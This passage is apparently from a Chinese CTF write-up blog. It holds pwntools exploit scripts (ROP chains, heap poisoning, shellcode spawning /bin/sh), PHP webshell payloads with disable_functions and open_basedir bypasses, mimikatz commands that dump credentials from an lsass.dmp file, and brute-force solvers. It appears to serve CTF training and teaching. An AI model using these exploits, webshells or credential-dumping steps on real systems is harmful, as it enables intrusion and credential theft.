libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;)            libc.address=d-libc.sym[func]            system=libc.sym[&#x27;system&#x27;]            bin_sh=next(libc.search(b&quot;/bin/sh\x00&quot;))            gdb.attach(p)        else:            libc=LibcSearcher(func,d)            system=libc.dump(&#x27;system&#x27;)            bin_sh=libc.dump(&#x27;str_bin_sh&#x27;)        payload=p64(ret)*0x1a+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)        payload+=p64(ret)        payload+=p64(canary)        p.sendlineafter(&#x27;name: &#x27;,b&#x27;%41$p&#x27;)        p.sendafter(&#x27;NKCTF: &#x27;,payload)        p.interactive()    except:        pass    try:        p.close()    except:        pass

baby_heapfrom pwn import *e=ELF(&#x27;./pwn&#x27;)context.binary=elibc=ELF(&quot;./libc-2.32.so&quot;)#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)def add(ind,size):    p.sendlineafter(&quot;choice: &quot;,b&#x27;1&#x27;)    p.sendlineafter(&quot;index: &quot;,str(ind))    p.sendlineafter(&#x27;Size: &#x27;,str(size))def free(ind):    p.sendlineafter(&quot;choice: &quot;,b&#x27;2&#x27;)    p.sendlineafter(&quot;index: &quot;,str(ind))def edit(ind,data):    p.sendlineafter(&quot;choice: &quot;,b&#x27;3&#x27;)    p.sendlineafter(&quot;index: &quot;,str(ind))    p.sendafter(&#x27;content: &#x27;,data)def show(ind):    p.sendlineafter(&quot;choice: &quot;,b&#x27;4&#x27;)    p.sendlineafter(&#x27;index: &#x27;,str(ind))def calc_fd(c,off):    off1=off    off=off    h=hex(c)[2:].strip(&#x27;L&#x27;)[::-1]    e=[]    for i in range(0,len(h),3):        e.append(h[i:i+3][::-1])    uh=[]    xc=0    for i in e:        hc=int(i,16)^(xc+(off&amp;0xfff))        xc=hc        off=off&gt;&gt;12        uh.append(hex(hc)[2:].strip(&#x27;L&#x27;).zfill(3))    heap_len=len(h)-3    uh=&#x27;&#x27;.join(uh[::-1])[-heap_len:]+&#x27;000&#x27;    fd=int(uh,16)+off1    return fddef enc_fd(fd,next_):    return (fd&gt;&gt;12)^next_#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;node2.yuzhian.com.cn&#x27;,&#x27;32973&#x27;)for i in range(9):    add(i,0x88)for i in range(8):    free(i)#gdb.attach(p)#pause()add(7,0x48)edit(7,b&#x27;\n&#x27;)show(7)pause()d=u64(p.read(6).ljust(8,b&#x27;\x00&#x27;))&amp;0xffffffffffffff00main_area=d-0x60print(hex(d))malloc_hook=main_area-0x10libc.address=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]free_hook=libc.sym[&#x27;__free_hook&#x27;]system=libc.sym[&#x27;system&#x27;]for i in range(7):    add(6-i,0x88)show(1)heap_1_c=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))heap=calc_fd(heap_1_c,0x2a0)print(hex(heap))pause()pad=b&#x27;\x00&#x27;*0x58+p64(0x91)+b&#x27;\n&#x27;edit(1,pad)edit(2,pad)edit(3,pad)pad1=b&#x27;\x00&#x27;*0x88+b&#x27;\xf1&#x27;edit(0,pad1)free(1)add(1,0xe8)free(3)free(2)payload=b&#x27;\x00&#x27;*0x88+p64(0x91)+p64(enc_fd(heap+0x290+0x90+0x90+0x10,free_hook))+b&#x27;\n&#x27;edit(1,payload)edit(0,b&#x27;/bin/sh\x00\n&#x27;)add(2,0x88)add(3,0x88)edit(3,p64(system)+b&#x27;\n&#x27;)free(0)p.interactive()

9961codefrom pwn import *context.arch=&#x27;amd64&#x27;sh=&quot;&quot;&quot;syscallmov rdi,r15and esi,edimov dx,0xfadd eax,0x30syscallmov esi,edixor edi,edijmp rsi&quot;&quot;&quot;sh1=&quot;&quot;&quot;syscalladd edx,0x30mov ax,0jmp rsi&quot;&quot;&quot;sh2=&quot;&quot;&quot;    syscall    mov edi,0x9961020    xor rsi,rsi    xor rdx,rdx    mov ax,0x3b    syscall&quot;&quot;&quot;print(len(asm(sh)))#p=process(&#x27;./pwn&#x27;)p=remote(&quot;node2.yuzhian.com.cn:32041&quot;)#gdb.attach(p,&#x27;bp main+294&#x27;)#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)pause()p.sendafter(&#x27;shellcode&#x27;,asm(sh))pause()p.sendline(asm(sh1))pause()p.sendline(asm(sh2).ljust(0x20,b&#x27;\x90&#x27;)+b&#x27;/bin/sh\x00&#x27;)p.interactive()


only_readfrom pwn import *import base64e=ELF(&#x27;./pwn&#x27;)read=0x4013d0leave=0x4013e7ret=0x4013e8from mcrypt import *c=[b&quot;Welcome to NKCTF!\x00&quot;,\        b&quot;tell you a secret:\x00&quot;,\        b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;,\        b&quot;can you find me?\x00&quot;]#p=process(&#x27;./pwn&#x27;)p=remote(&quot;node2.yuzhian.com.cn:31146&quot;)base=b64()base.setbase(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;)for i in c:    print(i)    p.sendline(base.encode(i))    pause()rel=0x4005d8#str_t=0x3ff388#sym=0x3ff420sym=0x4003d0str_t=0x4004c0bss=0x404900+0xc0*8+0x40+0x20print(hex(bss))sym_ind=905func_got=e.got[&#x27;memset&#x27;]rdi=0x00401683rel_add=bss+6*0x8+0x18sym_add=bss+6*0x8print(hex(rel_add))gogo=0x401039#p.interactive()pad=b&#x27;\x00&#x27;*0x10pad_n=3bin_sh=bsssystem=bss+0x28str_=b&#x27;/bin/sh\x00\x00system\x00&#x27;sym_=p32(system-str_t)+p64(12)+p32(0)*3rel_=p64(bss-0x30)+p32(7)+p32((sym_add-sym)//0x18)+p32(0)*2#gdb.attach(p,&#x27;bp 0x401039&#x27;)#pause()print(hex(rel_add-rel))payload2=b&#x27;\x00&#x27;*0x30payload2+=b&quot;/bin/sh\x00&quot;+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//0x18+1)payload2+=b&quot;system\x00\x00&quot;payload2+=sym_+p64(0)*2+rel_payload=b&#x27;a&#x27;*0x30+p64(bss)+p64(read)p.sendline(payload)pause()p.sendline(payload2)p.interactive()

notefrom pwn import *def add(ind,size,data=&quot; &quot;):    p.sendlineafter(&quot;choice: &quot;,&#x27;1&#x27;)    p.sendlineafter(&#x27;Index: &#x27;,str(ind))    p.sendlineafter(&#x27;Size: &#x27;,str(size))    p.sendafter(&quot;Content: &quot;,data)def edit(ind,data):    p.sendlineafter(&quot;choice: &quot;,&#x27;2&#x27;)    p.sendlineafter(&#x27;Index: &#x27;,str(ind))    p.sendlineafter(&#x27;Size: &#x27;,str(len(data)))    p.sendafter(&quot;Content: &quot;,data)def free(ind):    p.sendlineafter(&quot;choice: &quot;,&#x27;3&#x27;)    p.sendlineafter(&#x27;Index: &#x27;,str(ind))def show(ind):    p.sendlineafter(&quot;choice: &quot;,&#x27;4&#x27;)    p.sendlineafter(&#x27;Index: &#x27;,str(ind))e=ELF(&#x27;./nk_note&#x27;)context.binary=elibc=ELF(&#x27;./libc.so&#x27;)p=remote(&quot;node2.yuzhian.com.cn:30946&quot;)#p=process(&quot;./nk_note&quot;)#gdb.attach(p)context.log_level=&#x27;debug&#x27;show(16)d=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(d))pause()add(0,0x500,&quot;/bin/sh\x00&quot;)add(1,0x300)add(2,0x100)add(3,0x80)add(4,0x40)add(5,0x20)payload=b&#x27;a&#x27;*0x10edit(16,payload)show(16)p.readuntil(&#x27;a&#x27;*0x10)d1=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(d1))e.address=d1-0x4120func=&#x27;puts&#x27;func_got=e.got[func]l=[]for i in range(0x6B):    payload=&#x27;a&#x27;*i*8    edit(16,payload)    show(16)    data=p.readuntil(&#x27;\n&#x27;,drop=1).strip(b&#x27;a&#x27;).ljust(8,b&#x27;\x00&#x27;)    dn=u64(data)    l.append(dn)print(l)pause()payload=flat(l)+p64(e.address+0x4150)edit(16,payload)ind=0x26print(hex(e.address))add(5,0x40)edit(5,p64(func_got))show(ind)dd=u64(p.readuntil(&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(dd))libc.address=dd-libc.sym[func]print(hex(libc.address))system=libc.sym[&#x27;system&#x27;]print(hex(e.got[&#x27;free&#x27;]))edit(5,p64(e.got[&#x27;free&#x27;]))edit(ind,p64(system))free(0)p.interactive()


reverseez_baby_apk使用jadx加雷电模拟器进行调试



PMKF
a=[&quot;1122&quot;,&quot;3322&quot;,&quot;1223&quot;,&quot;2211&quot;,&quot;0111&quot;,&quot;1101&quot;,&quot;0000&quot;,&quot;0101&quot;,&quot;1211&quot;,&quot;0111&quot;,&quot;2223&quot;,&quot;2330&quot;,&quot;3323&quot;,&quot;2211&quot;,&quot;1112&quot;,&quot;2333&quot;]e=[]k=b&#x27;nkman&#x27;k1=0for i in k:    k1+=ik1=k1&amp;0xffprint(k1)for i in a:    c=&#x27;&#x27;    for j in i:        c+=bin(int(j))[2:].zfill(2)    e.append(int(c,2)^k1)print((b&#x27;\x05&#x27;+b&#x27;nkman&#x27;+bytes(e)).hex())

babyrust
a=b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;e=[]for i in a:    d=(i-0x28+45)^0x30    if d&lt;0x20:        d=d+48    e.append(d)print(bytes(e))]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023竞赛</tag>
        <tag>nkctf</tag>
      </tags>
  </entry>
  <entry>
    <title>奇安信CTF基础培训题目wp</title>
    <url>/posts/3ba7d05a/</url>
    <content><![CDATA[第一次当ctf讲师^_^
7.12-7.19 week17.19-7.26 week27.26-8.02 week3
webWeb-2-hack使用dirsearch扫描后台，发现存在shell.php

使用burp等工具抓包爆破密码，得到密码hack

web-3-web82&lt;?phphighlight_file(__FILE__);ini_set(&quot;display_error&quot;, false);error_reporting(0);$str = isset($_GET[&#x27;A_A&#x27;])?$_GET[&#x27;A_A&#x27;]:&#x27;A_A&#x27;;if (strpos($_SERVER[&#x27;QUERY_STRING&#x27;], &quot;A_A&quot;) !==false) &#123;    echo &#x27;A_A,have fun&#x27;;&#125;elseif ($str&lt;9999999999) &#123;    echo &#x27;A_A,too small&#x27;;&#125;elseif ((string)$str&gt;0) &#123;    echo &#x27;A_A,too big&#x27;;&#125;else&#123;    echo file_get_contents(&#x27;flag.php&#x27;);&#125;?&gt;

需要我们传入A_A，但是又不能等于A_A，看似很矛盾，实际上利用了php的一个小特性
在php中，变量名中的+ %20 . 空格 [会被替换成下划线，所以当我们传入A.A或A A时，也会被当成A_A
然后就是绕过数字，因为在php中会认为数组比数字大，所以传入?A+A[]=即可
vipzone首页有个hint，guest:guest 账户已经启用，那就用guest账号登录看一下
发现有两个cookie比较可疑，因为有一个非常明显是base64加密后的值

base64解密后发现是明文的序列化对象

而第二个cookie: check恰恰用这串base64的md5值的base64值来校验
所以我们只需要修改序列化对象然后加密就可以绕过登录了
但是我们不知道admin的密码，这里可以尝试用布尔型代替密码，并赋值为1
修改后的值：O:4:&quot;User&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;b:1;&#125;base64加密：Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=md5加密：6897f0060a84ecb0600e4167d2a748e4

web-3-web54&lt;?phperror_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#x27;args&#x27;]))&#123;    $args = $_GET[&#x27;args&#x27;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;

有一个正则匹配/^\w+$/

            两个&#x2F;&#x2F;表示开始和结束^表示开始字符串$表示结束字符串\w表示包含[a-z，A-Z, _ , 0-9]+表示一个或者多个\w
          


然后是一个$$args，也就是说我们传入的参数将会被当作一个变量名并打印它的变量值
传入php超全局变量$GLOBALS即可

Web-4-littledropbox&lt;?phpfunction upload()&#123;    $uploadDir = &quot;uploads/&quot; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    echo md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);    if (!is_dir($uploadDir)) mkdir($uploadDir);    if (!empty($_FILES[&quot;file&quot;])) &#123;        if (preg_match(&quot;/ph/i&quot;, substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &quot;.&quot;) + 1))) die(&quot;nonono!!!&quot;);        if (mb_strpos(file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]), &#x27;&lt;?&#x27;) !== False) die(&quot;nonono!!!&quot;);        $info = getimagesize($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);        if ($info[0] !== 100 || $info[1] !== 50) &#123;            die(&quot;nonono!!!&quot;);        &#125;    &#125;    @move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $uploadDir . &quot;/&quot; . basename($_FILES[&quot;file&quot;][&quot;name&quot;]));&#125;$ready = filter_input(INPUT_GET, &#x27;ready&#x27;);$key = filter_input(INPUT_GET, &#x27;key&#x27;);if ($ready === &quot;1&quot;) &#123;    session_start();    if (!isset($_SESSION[&quot;secretKey&quot;])) &#123;        $_SESSION[&quot;secretKey&quot;] = mt_rand();    &#125;    mt_srand($_SESSION[&quot;secretKey&quot;]);    echo mt_rand() . &quot;&lt;br&gt;&quot;;    for ($i = 0; $i &lt; 225; $i++) mt_rand();    echo mt_rand() . &quot;&lt;br&gt;&quot;;    echo mt_rand() . &quot;&lt;br&gt;&quot;;    echo mt_rand() . &quot;&lt;br&gt;&quot;;    if ($key === (string)$_SESSION[&#x27;secretKey&#x27;]) &#123;        upload();    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;


pwnraceida分析：1：当i大于9，且输入不为1时，会调用system(&quot;/bin/sh&quot;)；2：修改i的值需要调用thread1函数，在这里因为count = 3 ，而每次执行thread1函数，都会使count--,在正常的使用中，最多只能执行三次i++，不过因为sleep(0xA)的原因，线程会在验证count的值之后停下，我们可以在这10秒中，调用多次thread1函数，使多个线程卡在++i指令之前，在10秒之后，就会执行多次++i指令，使i&gt;9，这时输入一个非1的数字，程序就会调用system(&quot;/bin/sh&quot;)

import timefrom pwn import *p=remote(&#x27;172.19.1.28&#x27;,&#x27;10001&#x27;)for i in range(10):    p.sendline(&#x27;1&#x27;)time.sleep(0xb)p.sendline(&#x27;2&#x27;)p.interactive()


race2在file_read函数中，当buf字符串中不存在flag时，会先等待5秒然后打开buf字符串指定的文件，并输出文件内容

但因为程序是使用多线程调用的file_read函数，所以程序在等待5秒时，我们还是可以修改buf字符串的值
最后只需要先让线程执行到sleep(5);代码处，然后再输入flag，然后等待一段时间，程序就会打开靶机上的flag文件，并输出其内容

from pwn import *import timep=remote(&#x27;172.19.1.132&#x27;,10002)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;abc&#x27;)time.sleep(1)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;flag&#x27;)time.sleep(5)p.interactive()


miscmisc-3-hacker下载得到一个lsass.dmp文件，什么是lsass.dmp呢，它是procdump从lsass.exe中导出的凭据，可以用mimikatz读取
把文件放到程序目录下，以管理员运行mimikatz，执行以下命令

            privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full
          



如果报错ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;ProcessorArchitecture (0) != PROCESSOR_ARCHITECTURE_AMD64 (9)
那么可能是架构错了，用win32版本重新运行即可
misc-3-funny ASCII二进制数据转成文本即可

misc-4-password打开一看，发现有几个文件很小，只有4

一般小于6的文件是可以进行crc爆破的，推荐工具
用法：python crc32.py reverse crc

提取出来后转字符串得到easypassword，解压得到flag
misc103根据题目描述来看是一道数据恢复题
file命令看下文件badimages: Linux rev 1.0 ext3 filesystem data, UUID=ca014691-c6ea-4a5a-8da4-74a1aa1c9a80
可以知道是linux下的ext3文件，linux下的文件恢复可以用extundelete命令
看日志：extundelete &lt;file&gt; --journal

尝试恢复所有目录和文件：extundelete &lt;file&gt; --restore-all

恢复到RECOVERED_FILES目录
flag在RECOVERED_FILES/Flag.txt中
Misc-5-Forgotten password取证题
第一步肯定是获取内存镜像的基本信息

根据hint小明总是喜欢password记录下来，用editbox显示出有关编辑控件的信息，得到密码password*&amp;!@wxcq12

用密码直接交不对，那么应该是压缩包之类的密码了查找压缩包并导出

用editbox得到的密码解压压缩包拿到flag
cryptoWrite a scriptmd5爆破
import hashlibimport itertoolsword=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;r=itertools.product(word,repeat=3)for i in r:    dec =&quot;flag&#123;P7%sY0OG%s0XPC%sZPK&#125;&quot;%(i[0],i[1],i[2])    dec=dec.strip()    enc = hashlib.md5()    enc.update(dec.encode())    code=enc.hexdigest()    code=code.strip()    if code[:4]==&quot;9e86&quot; and code[-6:]==&quot;0ea7cf&quot;:        print(dec)


base给了一个py文件和明文的md5值
代码中明文base64加密之后将小写字母全部变为大写
使用脚本暴力破解
# -*-coding: utf-8 -*-import hashlibimport itertoolsimport base64def check(str):    m1 = hashlib.md5(str).hexdigest()    if m1 == &#x27;16478a151bdd41335dcd69b270f6b985&#x27;:        return True    else:        return Falselist1=itertools.product([&#x27;Y&#x27;,&#x27;y&#x27;],[&#x27;M&#x27;,&#x27;m&#x27;],[&#x27;F&#x27;,&#x27;f&#x27;],[&#x27;Z&#x27;,&#x27;z&#x27;],[&#x27;Z&#x27;,&#x27;z&#x27;],[&#x27;T&#x27;,&#x27;t&#x27;],[&#x27;Y&#x27;,&#x27;y&#x27;],[&#x27;0&#x27;],[&#x27;D&#x27;,&#x27;d&#x27;],[&#x27;3&#x27;],[&#x27;R&#x27;,&#x27;r&#x27;],[&#x27;M&#x27;,&#x27;m&#x27;],[&#x27;D&#x27;,&#x27;d&#x27;],[&#x27;3&#x27;],[&#x27;R&#x27;,&#x27;r&#x27;],[&#x27;M&#x27;,&#x27;m&#x27;],[&#x27;M&#x27;,&#x27;m&#x27;],[&#x27;T&#x27;,&#x27;t&#x27;],[&#x27;I&#x27;,&#x27;i&#x27;],[&#x27;Z&#x27;,&#x27;z&#x27;])for i in list1:    str1=&#x27;&#x27;.join(i)    if check(base64.b64decode(str1)):        print &quot;The Flag is &quot;+base64.b64decode(str1)        break    else:        print &quot;not &quot;+str1



reverse一张来自夏天的车票pyc文件，先进行反编译
uncompyle6 exp.pyc &gt; exp.py失败，修复下文件
file看下版本，是3.6的

构造一个3.6生成的pyc文件与exp.pyc对比
会发现中间少了四个字节

填充上00

反编译后运行得到flag
# uncompyle6 version 3.8.0# Python bytecode 3.6 (3379)# Decompiled from: Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)]# Embedded file name: exp.py# Compiled at: 2021-06-10 15:30:34import base64key = &#x27;e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f&#x27;enc = &#x27;XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf&#x27;print(key[(len(key) - 1)])def decode2(m):    return base64.urlsafe_b64decode(m)def decode1(m, key):    flag = &#x27;&#x27;    for i in range(len(key) - 6):        flag += chr(ord(key[i]) ^ ord(chr(m[i])))    return flagprint(decode2(enc))tmp = decode1(decode2(enc), key)print(tmp)# okay decompiling exp.pyc

啊？安卓逆向题，先在模拟器上安装，找到验证函数

跳转到check方法
public class M extends T &#123;    public void check(String str) &#123;        String key;        if (str.length() != 16) &#123;            throw new RuntimeException();        &#125;        try &#123;            key = m0getey();        &#125; catch (Exception e) &#123;            key = getKey();            System.arraycopy(key, 0, str, 5, 5);        &#125;        int[] iArr = new int[16];        iArr[0] = 42;        iArr[12] = 14;        iArr[10] = 7;        iArr[14] = 15;        iArr[15] = 17;        try &#123;            iArr[1] = 43;            iArr[5] = 5;            System.out.println();        &#125; catch (Exception e2) &#123;            iArr[5] = 37;            iArr[1] = 85;        &#125;        iArr[6] = 15;        iArr[2] = 32;        iArr[3] = 23;        iArr[11] = 68;        iArr[4] = 85;        iArr[13] = 5;        iArr[9] = 7;        iArr[7] = 8;        iArr[8] = 22;        for (int i = 0; i &lt; str.length(); i++) &#123;            if ((iArr[i] &amp; 255) != ((str.charAt(i) ^ key.charAt(i % key.length())) &amp; 255)) &#123;                throw new RuntimeException();            &#125;        &#125;    &#125;

本题的关键就是最后那个if判断，会将输入的字符串与key进行异或，值存储在iArr数组里
从上面贴出代码的第八行跳转到m0getey函数获取key

解密脚本将数组中的值和key逐个异或即可得到flag
v1 = [42, 43, 32, 23, 85, 5, 15, 8, 22, 7, 7, 68, 14, 5, 15, 17]key = &quot;anylab&quot;for x in range(16):    print(chr((v1[x] &amp; 255) ^ (ord(key[x % 6]) &amp; 255)), end=&quot;&quot;)]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>奇安信</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-breakout-wp</title>
    <url>/posts/31724a07/</url>
    <content><![CDATA[题目代码&lt;?phphighlight_file(__FILE__);// 这些奇怪的符号是什么呢?字符串之间还能异或的吗?$a = $_POST[&#x27;v&#x27;] ^ &#x27;!-__)^&#x27;;// ctf常见的验证码哦!纯数字呢if (substr(md5($_POST[&#x27;auth&#x27;]),0,6) == &quot;666666&quot;) &#123;    $a($_POST[&#x27;code&#x27;]);&#125;

代码分析代码会将v和!-__)^进行异或，所以我们需要构造出一个值，异或后为函数名脚本如下
a=&quot;!-__)^&quot;b=&quot;assert&quot;        //需要的函数名c=&quot;&quot;for i in a:    c+=chr(ord(b[len(c)])^ord(i))print(c)
所以v的值就为@^,:[*
接下来是一个MD5的截断比较，找一个MD5后前6位为666666的值即可，例如oT7mgbJMTNyh9qWYQT2d
code就是要执行的内容了
现在将三部分连接在一起成功执行phpinfo
绕过disable_function有了phpinfo，肯定要看一下disable_functions可以看到常用的system等基本都被禁用了
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,apache_setenv,symlink,link,error_log,iconv
那么我们就需要绕过disable_function先用蚁剑连上，方便操作
绕过disable_function有很多种方法，但这里大都被禁用了，所以最后采用的是利用 LD_PRELOAD 环境变量来绕过首先下载绕过代码需要用到如下这4个文件

bypass_disablefunc.php：一个用来执行命令的 webshell。bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。bypass_disablefunc.c：用来编译生成上面的共享对象文件。

对于bypass_disablefunc.php，如果有权限就上传到web目录直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：
cmd 参数：待执行的系统命令，如 id 命令。outpath 参数：保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。
在回过头来看题目，/var/www/html目录是没有权限的，/tmp目录可读可写，所以将文件上传到/tmp目录下在code中用文件包含调用bypass_disablefunc.php然后GET传入三个参数会发现无法执行
检查一下bypass_disablefunc.php中的代码比较后发现mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);中的mail被禁用了可以使用mail的封装函数mb_send_mail来绕过成功绕过执行ls /后执行/readflag即可拿到flag
绕过open_basedir看到这个环境还不错，顺手试了一下绕过open_basedir因为是静态靶机，所以能看到其他师傅的马，直接包含，不用在上传了
&lt;?php $a=mkdir(&#x27;/tmp/test&#x27;);chdir(&#x27;/tmp/test&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;));@eval($_POST[a]); echo 1;
哈哈哈哈，在线聊天室蚁剑连接可以看到根目录文件了
总结这一题考点很多，并没有表面那么简单，学到很多新姿势
特别鸣谢：@Hel1antHu5师傅参考文章：绕过Disable Functions来搞事情
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>disable_functions</tag>
        <tag>极客挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯青少年杯初赛wp</title>
    <url>/posts/2ef8c529/</url>
    <content><![CDATA[战队信息战队名称：Rml战队排名：5
解题情况
解题过程webweb1CVE-2021-41773，payload直接打

miscmisc1base64解密后得到一张图片，但是每两个字节被换了位置
修复脚本
f=open(&#x27;a.png&#x27;,&#x27;rb&#x27;)f1=open(&#x27;b.png&#x27;,&#x27;wb&#x27;)data=f.read()for i in range(0,len(data),2):    f1.write(data[i:i+2][::-1])

得到hint密钥就是音乐的财富密码，加上题目描述你知道万能和弦是什么吗?，得到4536251
lsb解密得到flag

misc2赛后复现
祥云杯shuffle_code的后半部分
按行打乱了网上的爆破脚本
data = [[1,1,1,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,0,1,0,1,1,1,1,1,1,1],[1,0,0,0,0,0,1,0,1,0,1,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,1],[1,0,1,1,1,0,1,0,1,0,1,1,1,1,1,0,0,0,0,1,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,1,1,1,0,0,1,1,0,1,0,1,0,1,1,1,0,1],[1,0,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,1,0,0,1,0,1,1,1,0,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,1,0,0,0,0,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1],[0,0,0,0,0,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[1,0,0,1,1,1,1,1,1,0,1,0,0,0,0,1,1,1,1,1,1,1,0,0,1,0,1,1,1],[1,1,1,1,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,1,0,1,1,1,1,0,0,1],[1,1,0,0,1,0,1,1,0,0,1,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,0,1],[0,1,1,0,1,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,1,1,0,1,1,1,0,1],[1,1,0,0,1,0,1,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,1,1,0,1,0,0,1],[1,1,1,0,1,0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,0,0,0,1,1,1,0,0,0],[0,0,0,0,1,0,1,1,0,0,1,0,1,0,1,1,0,1,1,0,1,1,1,0,1,1,0,0,0],[1,1,1,1,1,1,0,1,0,0,0,1,0,1,0,1,0,0,1,0,1,1,0,1,1,1,1,0,1],[0,1,1,1,0,1,1,1,1,0,0,1,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,1],[1,0,0,1,1,0,0,0,1,1,1,0,1,1,0,1,0,1,0,1,1,1,0,0,1,1,1,0,0],[1,0,1,1,1,1,1,1,0,0,1,0,1,0,1,1,1,0,1,1,0,1,1,1,0,0,0,1,1],[1,0,1,1,1,1,0,0,1,1,0,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,0,1,1],[1,1,1,1,1,0,1,1,0,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1],[0,0,0,0,0,0,0,0,1,0,1,1,0,1,0,1,0,0,0,1,1,0,0,0,1,0,1,0,0],[1,1,1,1,1,1,1,0,1,0,0,1,0,1,0,1,0,1,1,1,1,0,1,0,1,1,0,0,0],[1,0,0,0,0,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,0,0,1,0,0,0,0],[1,0,1,1,1,0,1,0,1,0,0,0,1,1,1,0,0,0,1,1,1,1,1,1,1,0,0,1,0],[1,0,1,1,1,0,1,0,1,0,1,1,0,0,1,1,0,1,1,0,1,0,0,1,0,1,1,0,1],[1,0,1,1,1,0,1,0,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,0,0,1,1],[1,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,1,0,0,1,0,1,1,0,1,0,1,0,1],[1,1,1,1,1,1,1,0,1,0,1,0,0,0,0,1,0,0,0,0,1,0,1,1,0,1,0,0,0]]import pyzbar.pyzbar as pyzbarfrom itertools import permutationsfrom PIL import Image, ImageDraw as drawimport matplotlib.pyplot as pltfrom tqdm import tqdmshuffle_1 = [9, 11, 13, 15, 17, 19]shuffle_2 = [10, 12, 14, 16, 18]head = data[0:9]tail = data[20:]def body(body_1, body_2):    body = []    for 